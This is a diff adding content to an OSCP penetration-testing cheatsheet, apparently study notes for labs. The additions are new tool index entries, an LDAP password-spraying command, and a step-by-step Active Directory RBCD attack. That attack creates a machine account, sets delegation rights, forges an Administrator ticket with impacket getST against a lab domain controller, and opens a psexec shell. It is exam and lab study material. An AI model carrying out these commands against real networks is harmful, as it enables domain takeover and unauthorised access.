@@ -1,4 +1,4 @@
-# OSCP Cheatsheet
+# OSCP Cheatsheet — Organized
 
 > This CheatSheet have two section:
 > - **Part 1 - Tools**: commands grouped by tool
@@ -10,6 +10,7 @@
 
 ## Tools Index
 
+- [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
 - [Amass](#amass)
 - [Arp-scan](#arp-scan)
 - [BloodHound & Neo4j](#bloodhound--neo4j)
@@ -19,7 +20,9 @@
 - [CrackMapExec / NetExec](#crackmapexec--netexec)
 - [Curl](#curl)
 - [Dig](#dig)
+- [DNScat2](#dnscat2)
 - [Dnsenum](#dnsenum)
+- [DomainPasswordSpray](#domainpasswordspray)
 - [Enum4linux-ng](#enum4linux-ng)
 - [Evil-WinRM](#evil-winrm)
 - [Ffuf](#ffuf)
@@ -27,44 +30,58 @@
 - [GoBuster](#gobuster)
 - [Hashcat](#hashcat)
 - [Impacket Suite](#impacket-suite)
+- [IPMI](#ipmi)
 - [John The Ripper](#john-the-ripper)
 - [Kerbrute](#kerbrute)
+- [LAPSToolkit](#lapstoolkit)
 - [Ldapsearch](#ldapsearch)
 - [Ldapdomaindump](#ldapdomaindump)
 - [Ligolo-ng](#ligolo-ng)
 - [Metasploit](#metasploit)
 - [Msfvenom](#msfvenom)
+- [MSSQL](#mssql)
 - [MySQL Client](#mysql-client)
+- [MySQL (Advanced)](#mysql-advanced)
 - [Netcat & Ncat](#netcat--ncat)
+- [Nessus](#nessus)
+- [NFS](#nfs)
 - [Nikto](#nikto)
 - [Nmap](#nmap)
 - [ODAT (Oracle)](#odat-oracle)
 - [Onesixtyone](#onesixtyone)
 - [OpenSSL](#openssl)
+- [OpenVAS / GVM](#openvas--gvm)
+- [PowerView](#powerview)
 - [Proxychains](#proxychains)
+- [ptunnel-ng](#ptunnel-ng-icmp-tunneling)
 - [RDP Clients](#rdp-clients)
+- [R-services](#r-services-rlogin--rwho--rusers)
 - [Responder / Inveigh](#responder--inveigh)
 - [Rpcclient](#rpcclient)
+- [Rubeus](#rubeus)
 - [Rsync](#rsync)
 - [Shells](#shells)
+- [SharpView](#sharpview)
 - [Smbclient](#smbclient)
 - [Smbmap](#smbmap)
+- [SMTP / IMAP / POP3](#smtp--imap--pop3)
 - [Smtp-user-enum](#smtp-user-enum)
+- [Snaffler](#snaffler)
 - [Snmpwalk](#snmpwalk)
 - [Socat](#socat)
+- [SocksOverRDP](#socksoverdp)
 - [SQLplus (Oracle)](#sqlplus-oracle)
 - [SSH](#ssh)
 - [Sshuttle](#sshuttle)
 - [Subfinder](#subfinder)
 - [Wafw00f](#wafw00f)
 - [Whatweb](#whatweb)
+- [Windapsearch](#windapsearch)
 - [Wireshark & Tcpdump](#wireshark--tcpdump)
+- [WMI / wmiexec](#wmi--wmiexec)
 - [File Transfer Methods](#file-transfer-methods)
 - [Windows Port Forwarding](#windows-port-forwarding)
 - [System Commands](#system-commands)
-- [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
-- [SharpView](#sharpview)
-- [Snaffler](#snaffler)
 
 ---
 
@@ -2249,6 +2266,16 @@ Flags:
 - [Security Controls Enumeration](#security-controls-enumeration)
 - [Credentialed Enumeration](#credentialed-enumeration)
 - [Living Off the Land](#living-off-the-land)
+- [NFS — Privilege Escalation](#nfs--privilege-escalation)
+- [SMTP — Enumeration Methodology](#smtp--enumeration-methodology)
+- [IPMI — Attack Procedure](#ipmi--attack-procedure)
+- [SSH with Kerberos](#ssh-with-kerberos)
+- [Shells and Payloads — Strategy](#shells-and-payloads--strategy)
+- [TTY Upgrade — Procedure](#tty-upgrade--procedure)
+- [Metasploit — Advanced Workflow](#metasploit--advanced-workflow)
+- [Advanced Pivoting — Strategy](#advanced-pivoting--strategy)
+- [Password Spraying Scenarios](#password-spraying-scenarios)
+- [Local Administrator Password Reuse](#local-administrator-password-reuse)
 
 ---
 
@@ -2842,6 +2869,11 @@ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
 
+Password spraying for LDAP service:
+```bash
+netexec ldap <IP> -u user.list -p 'password' --continue-on-success
+```
+
 **Spraying from Windows (DomainPasswordSpray):**
 ```powershell
 Import-Module .\DomainPasswordSpray.ps1
@@ -2877,6 +2909,123 @@ The `--local-auth` flag attempts login once per machine, avoiding lockouts.
 - **Seatbelt**: security check
 - **JAWS**: PowerShell script
 - **PowerUp.ps1**: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+
+### RBCD Attack
+
+Resource-Based Constrained Delegation.
+
+Is a method to give granular permission to users and services.
+
+In this case it is possible that user or nestead groups have "GenericAll" and can do what they want with objects.
+
+You have a python script that do all automatically:
+- https://github.com/tothi/rbcd-attack
+
+If you search in [hacktricks](https://hacktricks.wiki/es/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html?highlight=rbcd#limpieza--restablecimiento-de-rbcd) how to exploit it.
+
+#### Create a computer object
+
+You can use [pwermad](https://github.com/Kevin-Robertson/Powermad)
+
+```powershell
+import-module .\Powermad.ps1
+```
+
+```powershell
+New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+You can change the machineAccount and the password (SecureString), but you will need to remember later.
+
+Check if it is created (before check you need to Import-Module PowerView)
+```powershell
+Get-DomainComputer SERVICEA
+```
+
+#### Configurating Resource-Based Constrained Delegation
+
+**Built-in module Powershell activedirectory**
+
+`$targetComputer` is the hostname of the machine, example, dc.
+
+Assign delegation privileges:
+```powershell
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$
+```
+
+Check that it worked:
+```powershell
+Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+**PowerView**
+
+Download PowerView.ps1:
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+Obtained the SID:
+```powershell
+$ComputerSid = Get-DomainComputer <COMPUTER_NAME> -Properties objectsid | Select -Expand objectsid
+```
+
+```powershell
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+```
+
+```powershell
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+```
+
+```powershell
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+Important to indicate the hostname of the machine:
+```powershell
+Get-DomainComputer <HOSTNAME> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+Check that it worked:
+```powershell
+Get-DomainComputer <HOSTNAME> -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+You have to see something like:
+
+```powershell
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
+
+#### Obtaining TGT ticket with impacket-getST.py
+
+All this in your attacker machine
+
+In hacktricks show that you can use rubeus, in place, we are going to obtain from the tool that could have automated all.
+https://github.com/tothi/rbcd-attack
+
+And we are going to the impacket-getST.py to create a Ticket Granting Ticket and saved as Administrator.ccache file
+```bash
+getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip <IP> support.htb/<HOSTNAME_CREATED_BEFORE>$:<PASSWORD_FOR_THE_COMPUTER_123456>
+```
+
+```bash
+getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip <IP> support.htb/SERVICEA$:123456
+```
+
+Create this environment variable:
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+#### Connect to the host
+
+```bash
+impacket-psexec -k dc.support.htb
+```
 
 ---
 
